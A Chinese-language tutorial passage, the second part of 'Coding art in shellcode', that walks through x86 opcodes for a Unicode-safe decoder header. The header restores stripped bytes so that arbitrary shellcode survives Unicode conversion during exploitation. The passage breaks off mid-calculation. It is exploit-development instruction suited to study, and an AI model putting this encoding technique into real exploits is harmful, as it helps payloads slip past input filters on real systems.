## 前言
* * *
欢迎到来Coding art in shellcode的第二部分，上文中我们逐步分析了各指令的opcode，总结出了有用的部件，下面就来拼凑这些东西。
## The Strategy
* * *
看起来几乎不可能用这么小的一组的opcode来组合获得一个可用的shellcode的opcode.....但不是！  
有个想法如下：  
给定一个可运行的shellcode，我们首先要做的就是摆脱每个字节之间的00。我们需要一个循环，所以让我们做一个循环，假设EAX指向我们的shellcode：
    ; eax points to our shellcode
    ; ebx is 0x00000000
    ; ecx is 0x00000500 (for example)
              label:
    43                inc ebx
    8A1458            mov byte dl,[eax+2*ebx]
    881418            mov byte [eax+ebx],dl
    E2F7              loop label
问题是这些不是Unicode。所以首先将其转化为Unicode:
    43 8A 14 58 88 14 18 E2 F7
转变 :
    43 00 14 00 88 00 18 00 F7
然后，记住我们可以在EAX指向的位置写入数据这一条件，将00转换为其原始值将变得很简单。  
我们只需这样做：
    40                inc eax
    40                inc eax
    C60058            mov byte [eax],0x58
问题是这些还是不是Unicode.,像0x40这样的两个字节我们需要在其间插入0c00,，不过像是00这样的不合适，我们需要这样的结构00？？00才不会影响我们的工作：
    add [ebp+0x0],al   (0x004500)
很好，这样我们可以得到：
    40                inc eax
    004500            add [ebp+0x0],al
    40                inc eax
    004500            add [ebp+0x0],al
    C60058            mov byte [eax],0x58
    40 00 45 00 40 00 45 00 C6 00 58
没什么作用，但这是一个Unicode字符了。
在Loop之前，我们必须完成一些事情：  
首先我们必须设置一个合适的计数器，我建议将ECX设置为0x0500，这样用来处理1280字节的shellcode（可随意更改）。
  * > 这很容易做，这要归功于我们刚刚思考的结果。  
>  其次就是EBX = 0x00000000，这样循环才能正常工作。
  * > 这也很容易做到。  
>  最后，我们必须让EAX指向我们的shellcode才能去掉null。
  * > 这个是一个比较烧脑的工作，我们稍后再提。
假设EAX指向我们的代码，我们可以构建header来清除接着代码的0x00（使用 add [ebp+0x0],al 来对齐null）。
  1. 设置EBX = 0x00000000，ECX = 0x00000500（近似大小的缓冲区）
        6A00              push dword 0x00000000
    6A00              push dword 0x00000000
    5D                pop ebx
    004500            add [ebp+0x0],al
    59                pop ecx
    004500            add [ebp+0x0],al
    BA00050041        mov edx,0x41000500
    00F5              add ch,dh
  2. 还原LOOP代码
        43 00 14 00 88 00 18 00 F7
得还原成：
        43 8A 14 58 88 14 18 E2 F7
所以我们来修补这4个字节，很简单：
        mov byte [eax],0x8A
    inc eax
    inc eax
    mov byte [eax],0x58
    inc eax
    inc eax
    mov byte [eax],0x14
    inc eax
还有一种办法可以让eax操作shellcode：
        004500            add [ebp+0x0],al
    C6008A            mov byte [eax],0x8A   ; 0x8A
    004500            add [ebp+0x0],al
    40                inc eax
    004500            add [ebp+0x0],al
    40                inc eax
    004500            add [ebp+0x0],al
    C60058            mov byte [eax],0x58   ; 0x58
    004500            add [ebp+0x0],al
    40                inc eax
    004500            add [ebp+0x0],al
    40                inc eax
    004500            add [ebp+0x0],al
    C60014            mov byte [eax],0x14   ; 0x14
    004500            add [ebp+0x0],al
    40                inc eax
    004500            add [ebp+0x0],al
    40                inc eax
    004500            add [ebp+0x0],al
    C600E2            mov byte [eax],0xE2   ; 0xE2
    004500            add [ebp+0x0],al
    40                inc eax
    004500            add [ebp+0x0],al
现在EAX寄存器指向Loop的结尾，也就是说eax指向了shellcode。
  3. 循环代码（塞满了null）
        43                db 0x43
    00                db 0x00      ; overwritten with 0x8A
    14                db 0x14
    00                db 0x00      ; overwritten with 0x58
    88                db 0x88
    00                db 0x00      ; overwritten with 0x14
    18                db 0x18
    00                db 0x00      ; overwritten with 0xE2
    F7                db 0xF7
在这之后应该放置原始的可用shellcode。  
让我们计算一下这些header的大小（当然null不计数）：
        1st part : 10 bytes